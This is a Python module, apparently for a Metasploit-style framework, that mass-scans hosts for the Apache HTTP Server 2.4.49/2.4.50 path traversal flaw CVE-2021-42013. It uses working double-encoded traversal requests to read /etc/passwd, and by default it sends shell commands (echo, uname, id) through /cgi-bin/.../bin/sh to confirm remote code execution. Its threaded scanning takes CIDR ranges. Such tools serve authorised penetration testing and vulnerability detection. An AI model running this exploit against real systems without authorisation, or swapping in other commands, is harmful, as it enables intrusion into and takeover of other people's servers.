import re
import secrets
import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

PASSWD_RE = re.compile(r"root:[^:]*:0:0:")
MARKER = "METIS_42013_MARKER"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    lfi_path: str = ""
    lfi_depth: int = 0
    rce: bool = False
    cmd_output: str = ""


class ApachePathTraversalCVE202142013(Auxiliary):
    NAME = "Apache HTTP Server Path Traversal / RCE Scanner (CVE-2021-42013)"
    DESCRIPTION = (
        "Detects Apache HTTP Server 2.4.49/2.4.50 path traversal "
        "(CVE-2021-42013, the incomplete-fix variant of CVE-2021-41773). "
        "Probes both traversal encodings from the Nuclei template — "
        "double-encoded '%%32%65' and '.%%32%65' — against /etc/passwd. "
        "When LHOST-style confirmation isn't needed, VERIFY_RCE=true issues "
        "a benign echo through /cgi-bin/.../bin/sh to confirm command "
        "execution when mod_cgi is enabled."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2021-10-04"
    CHECK = True
    REFERENCES = [
        "CVE-2021-42013",
        "CVE-2021-41773",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-42013",
        "https://httpd.apache.org/security/vulnerabilities_24.html",
        "https://github.com/apache/httpd/commit/5c385f2b6c8352e2ca0665e66af022d6e936db6d",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("DEPTHS", default="4,5,6,7",
               description="comma-separated traversal depths to try"),
        Option("VERIFY_RCE", default=True, type=bool,
               description="after LFI confirmation, run a benign marker command via mod_cgi"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    ENCODINGS = ("double", "dot")

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _depths(self):
        raw = self.options["DEPTHS"] or "4,5,6,7"
        out = []
        for part in raw.split(","):
            part = part.strip()
            if not part:
                continue
            try:
                d = int(part)
            except ValueError:
                continue
            if 1 <= d <= 20 and d not in out:
                out.append(d)
        return out or [4, 5, 6, 7]

    def _lfi_path(self, encoding, depth):
        if encoding == "double":
            return "/icons/" + ("%%32%65%%32%65/" * depth) + "etc/passwd"
        return "/icons/" + (".%%32%65/" * depth) + "etc/passwd"

    def _cgi_path(self, depth):
        return "/cgi-bin/" + ("%%32%65%%32%65/" * depth) + "bin/sh"

    def _request(self, host, method, path, body=None, content_type=None):
        url = self._base_url(host) + path
        ctx = ssl._create_unverified_context()
        data = body.encode() if body else None
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        if content_type:
            req.add_header("Content-Type", content_type)
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")
        except urllib.error.URLError:
            raise

    def _try_lfi(self, host):
        for depth in self._depths():
            for enc in self.ENCODINGS:
                path = self._lfi_path(enc, depth)
                try:
                    st, body = self._request(host, "GET", path)
                except urllib.error.URLError:
                    return None, 0, ""
                if st == 200 and PASSWD_RE.search(body):
                    return path, depth, body
        return None, 0, ""

    def _try_rce(self, host, depth):
        marker = MARKER + "_" + secrets.token_hex(3)
        cmd = "echo " + marker + "; uname -a 2>/dev/null; id 2>/dev/null"
        body = "echo Content-Type: text/plain; echo; " + cmd + "\n"
        try:
            st, resp = self._request(host, "POST", self._cgi_path(depth),
                                     body=body,
                                     content_type="application/x-www-form-urlencoded")
        except urllib.error.URLError:
            return False, ""
        if marker in resp:
            return True, resp.strip()
        return False, ""

    def _probe(self, host):
        result = HostResult(host=host)

        try:
            path, depth, _ = self._try_lfi(host)
        except urllib.error.URLError as e:
            result.detail = type(e).__name__
            return result

        if not path:
            result.state = "safe"
            result.detail = "no traversal depth returned /etc/passwd"
            return result

        result.state = "vulnerable"
        result.lfi_path = path
        result.lfi_depth = depth
        result.detail = "LFI depth=" + str(depth)

        if self.options["VERIFY_RCE"]:
            ok, out = self._try_rce(host, depth)
            if ok:
                result.rce = True
                result.cmd_output = out.splitlines()[0] if out else ""
                result.detail += " + RCE"
            else:
                result.detail += " (LFI only)"

        return result

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="Apache httpd (vulnerable)",
        )
        vuln_info = h.detail
        if h.rce and h.cmd_output:
            vuln_info += " | cmd: " + h.cmd_output
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2021-42013",
            info=vuln_info,
        )

    def check(self):
        targets = self._expand_targets()
        if len(targets) > 1:
            print(colors.warn(
                "check on multiple targets: probing only " + targets[0] +
                " (use 'run' to scan all " + str(len(targets)) + ")"
            ))
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host)))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            print(colors.dimmed("  path: " + r.lfi_path))
            if r.rce and r.cmd_output:
                print(colors.session("  cmd: " + r.cmd_output))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        line = r.host + " - " + r.detail
                        if r.rce and r.cmd_output:
                            line += " | " + r.cmd_output
                        bar.log(colors.vuln(line))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            rce_count = sum(1 for h in hits if h.rce)
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                line = "    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail)
                print(line)
                print("      " + colors.dimmed("lfi: ") + colors.session(h.lfi_path))
                if h.rce and h.cmd_output:
                    print("      " + colors.dimmed("cmd: ") + colors.session(h.cmd_output))
            if rce_count:
                print(colors.dimmed("  (" + str(rce_count) + " host(s) also confirmed RCE)"))

        return hits
